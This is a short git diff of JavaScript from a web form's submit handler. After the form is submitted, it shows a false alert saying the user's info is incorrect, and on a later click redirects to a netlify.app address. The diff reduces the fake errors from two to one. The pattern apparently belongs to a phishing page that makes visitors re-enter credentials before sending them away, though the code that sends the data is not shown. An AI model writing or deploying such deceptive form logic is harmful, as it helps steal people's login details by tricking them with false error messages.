@@ -59,9 +59,8 @@ form.addEventListener("submit", e => {
   ).then((html) => {
     // show different alerts based on click count
     if (clickCount === 1) {
-      alert('Something went wrong');
-    } else if (clickCount === 2) {
       alert('Some of your info isnt correct. Please try again.');
+   
     } else {
       window.location.href = "https://chic-cajeta-b2c837.netlify.app/"; // redirect on the third click
     }
